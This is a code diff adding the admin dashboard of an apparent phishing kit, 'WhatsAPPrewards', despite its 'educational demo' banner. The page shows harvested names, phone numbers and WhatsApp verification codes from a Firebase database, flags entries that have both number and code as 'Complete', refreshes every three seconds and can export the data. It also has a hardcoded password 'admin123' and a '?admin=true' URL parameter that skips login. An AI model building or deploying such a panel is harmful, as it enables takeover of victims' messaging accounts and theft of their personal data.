@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - WhatsAPPrewards</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Disclaimer Banner -->
+        <div class="disclaimer-banner">
+            <i class="fas fa-info-circle"></i>
+            <span>Educational Demo Only - Not affiliated with WhatsApp or Meta</span>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content" style="padding-top: 80px;">
+            <div style="width: 100%; max-width: 1000px;">
+                <!-- Back Link -->
+                <a href="index.html" class="back-link">
+                    <i class="fas fa-arrow-left"></i>
+                    Back to Main
+                </a>
+
+                <!-- Admin Container -->
+                <div class="admin-container">
+                    <!-- Admin Login -->
+                    <div id="admin-login" style="display: none;">
+                        <div class="step-header">
+                            <h2>Admin Access</h2>
+                            <p>Enter admin credentials</p>
+                        </div>
+                        <form onsubmit="admin.login(event)">
+                            <div class="form-group">
+                                <label for="adminPassword">Admin Password</label>
+                                <input type="password" id="adminPassword" placeholder="Enter admin password" required>
+                                <span class="error-message" id="password-error"></span>
+                            </div>
+                            <button type="submit" class="btn btn-primary">Access Dashboard</button>
+                        </form>
+                    </div>
+
+                    <!-- Admin Dashboard -->
+                    <div id="admin-dashboard">
+                        <div class="admin-header">
+                            <div>
+                                <h1>Admin Dashboard</h1>
+                                <p style="color: var(--text-light); margin-top: 4px;">User submissions and verification codes <span style="color: #25d366; font-size: 12px;">(Auto-refreshing)</span></p>
+                            </div>
+                            <div class="admin-actions">
+                                <button class="btn btn-primary" onclick="admin.refreshData()">
+                                    <i class="fas fa-sync"></i>
+                                    Refresh
+                                </button>
+                                <button class="btn btn-secondary" onclick="admin.exportData()">
+                                    <i class="fas fa-download"></i>
+                                    Export
+                                </button>
+                                <button class="btn btn-secondary" onclick="admin.clearAllData()" style="background: #dc3545; color: white;">
+                                    <i class="fas fa-trash"></i>
+                                    Clear All
+                                </button>
+                                <button class="btn btn-secondary" onclick="admin.logout()">
+                                    <i class="fas fa-sign-out-alt"></i>
+                                    Logout
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Data Display -->
+                        <div id="data-display"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script>
+    <script src="script.js"></script>
+    <script>
+        // ============================================
+        // ADMIN DASHBOARD
+        // ============================================
+        const admin = {
+            isAuthenticated: false,
+            refreshInterval: null,
+            
+            async init() {
+                // Check URL parameter for admin access
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.get('admin') === 'true') {
+                    this.isAuthenticated = true;
+                }
+                
+                if (this.isAuthenticated) {
+                    document.getElementById('admin-login').style.display = 'none';
+                    document.getElementById('admin-dashboard').style.display = 'block';
+                    await this.displayData();
+                    this.startAutoRefresh();
+                } else {
+                    document.getElementById('admin-login').style.display = 'block';
+                    document.getElementById('admin-dashboard').style.display = 'none';
+                }
+            },
+
+            login(event) {
+                event.preventDefault();
+                const password = document.getElementById('adminPassword').value;
+                
+                if (password === 'admin123') {
+                    this.isAuthenticated = true;
+                    // Update URL to maintain session
+                    window.history.replaceState({}, '', '?admin=true');
+                    document.getElementById('admin-login').style.display = 'none';
+                    document.getElementById('admin-dashboard').style.display = 'block';
+                    this.displayData();
+                    this.startAutoRefresh();
+                } else {
+                    document.getElementById('password-error').textContent = 'Invalid password';
+                }
+            },
+
+            startAutoRefresh() {
+                this.refreshInterval = setInterval(() => {
+                    this.displayData();
+                }, 3000);
+            },
+
+            stopAutoRefresh() {
+                if (this.refreshInterval) {
+                    clearInterval(this.refreshInterval);
+                    this.refreshInterval = null;
+                }
+            },
+
+            logout() {
+                this.isAuthenticated = false;
+                this.stopAutoRefresh();
+                window.history.replaceState({}, '', window.location.pathname);
+                document.getElementById('admin-login').style.display = 'block';
+                document.getElementById('admin-dashboard').style.display = 'none';
+            },
+
+            async refreshData() {
+                await this.displayData();
+            },
+
+            async deleteEntry(index) {
+                if (confirm('Are you sure you want to delete this entry?')) {
+                    try {
+                        const data = await app.getAllUserData();
+                        data.splice(index, 1);
+                        await db.ref('users').set(data);
+                        await this.displayData();
+                    } catch (e) {
+                        console.error('Error deleting entry:', e);
+                        alert('Error deleting entry');
+                    }
+                }
+            },
+
+            async clearAllData() {
+                if (confirm('Are you sure you want to delete ALL data? This cannot be undone.')) {
+                    try {
+                        await db.ref('users').set([]);
+                        await this.displayData();
+                    } catch (e) {
+                        console.error('Error clearing data:', e);
+                        alert('Error clearing data');
+                    }
+                }
+            },
+
+            async displayData() {
+                const data = await app.getAllUserData();
+                const container = document.getElementById('data-display');
+
+                if (!data || data.length === 0) {
+                    container.innerHTML = `
+                        <div class="empty-state">
+                            <i class="fas fa-inbox"></i>
+                            <p>No user submissions yet</p>
+                        </div>
+                    `;
+                    return;
+                }
+
+                let html = `
+                    <div class="stats-summary" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
+                        <div class="stat-card" style="background: #e8f5e8; padding: 20px; border-radius: 10px; text-align: center;">
+                            <h3 style="color: #25d366; margin: 0 0 10px 0;">${data.length}</h3>
+                            <p style="margin: 0; color: #666;">Total Users</p>
+                        </div>
+                        <div class="stat-card" style="background: #fff3cd; padding: 20px; border-radius: 10px; text-align: center;">
+                            <h3 style="color: #856404; margin: 0 0 10px 0;">${data.filter(entry => entry.code && entry.code.toString().trim()).length}</h3>
+                            <p style="margin: 0; color: #666;">With Verification Codes</p>
+                        </div>
+                        <div class="stat-card" style="background: #d1ecf1; padding: 20px; border-radius: 10px; text-align: center;">
+                            <h3 style="color: #0c5460; margin: 0 0 10px 0;">${data.filter(entry => entry.phoneNumber && entry.phoneNumber.trim()).length}</h3>
+                            <p style="margin: 0; color: #666;">With Phone Numbers</p>
+                        </div>
+                    </div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Full Name</th>
+                                    <th>Phone Number</th>
+                                    <th>WhatsApp Experience</th>
+                                    <th>Verification Code</th>
+                                    <th>Submission Time</th>
+                                    <th>Status</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                `;
+
+                data.forEach((entry, index) => {
+                    const timestamp = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : 'N/A';
+                    const codeDisplay = (entry.code && entry.code !== null && entry.code !== 'null' && entry.code !== undefined && entry.code.toString().trim() !== '') ? 
+                        `<span style="background: #d4edda; color: #155724; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-weight: bold;">${this.escapeHtml(entry.code)}</span>` : 
+                        '<span style="color: #999; font-style: italic;">null</span>';
+                    
+                    const phoneDisplay = entry.phoneNumber && entry.phoneNumber.trim() ?
+                        `<span style="background: #cce5ff; color: #004085; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${this.escapeHtml(entry.phoneNumber)}</span>` :
+                        '<span style="color: #dc3545; font-style: italic;">Not provided</span>';
+                    
+                    const status = (entry.phoneNumber && entry.code && entry.code !== null && entry.code !== 'null' && entry.code !== undefined && entry.code.toString().trim() !== '') ? 
+                        '<span style="color: #28a745; font-weight: bold;">✓ Complete</span>' :
+                        '<span style="color: #ffc107; font-weight: bold;">⚠ Incomplete</span>';
+                    
+                    html += `
+                        <tr style="${(entry.phoneNumber && entry.code && entry.code !== null && entry.code !== 'null' && entry.code.toString().trim() !== '') ? 'background-color: #f8fff8;' : ''}">
+                            <td>${index + 1}</td>
+                            <td>${this.escapeHtml(entry.fullName || 'N/A')}</td>
+                            <td>${phoneDisplay}</td>
+                            <td>${this.escapeHtml(entry.whatsappYears || 'Not specified')}</td>
+                            <td>${codeDisplay}</td>
+                            <td>${timestamp}</td>
+                            <td>${status}</td>
+                            <td>
+                                <button onclick="admin.deleteEntry(${index})" style="background: #dc3545; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 12px;">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </td>
+                        </tr>
+                    `;
+                });
+
+                html += `
+                            </tbody>
+                        </table>
+                    </div>
+                    <div style="margin-top: 20px; padding: 16px; background: #f8f9fa; border-radius: 10px; border-left: 4px solid #25d366;">
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; text-align: center;">
+                            <div>
+                                <strong style="color: #25d366;">${data.length}</strong><br>
+                                <small style="color: #666;">Total Submissions</small>
+                            </div>
+                            <div>
+                                <strong style="color: #007bff;">${data.filter(entry => entry.phoneNumber && entry.phoneNumber.trim()).length}</strong><br>
+                                <small style="color: #666;">Phone Numbers</small>
+                            </div>
+                            <div>
+                                <strong style="color: #ffc107;">${data.filter(entry => entry.code && entry.code !== null && entry.code !== 'null' && entry.code.toString().trim() !== '').length}</strong><br>
+                                <small style="color: #666;">Verification Codes</small>
+                            </div>
+                            <div>
+                                <strong style="color: #28a745;">${data.filter(entry => entry.phoneNumber && entry.code && entry.code !== null && entry.code !== 'null' && entry.code !== undefined && entry.code.toString().trim() !== '').length}</strong><br>
+                                <small style="color: #666;">Complete Entries</small>
+                            </div>
+                        </div>
+                    </div>
+                `;
+
+                container.innerHTML = html;
+            },
+
+            escapeHtml(text) {
+                if (!text) return '';
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            },
+
+            exportData() {
+                app.exportData();
+            },
+
+            clearAllData() {
+                app.clearAllData();
+            }
+        };
+
+        // Initialize admin dashboard
+        document.addEventListener('DOMContentLoaded', () => {
+            initFirebase();
+            admin.init();
+        });
+    </script>
+</body>
+</html>
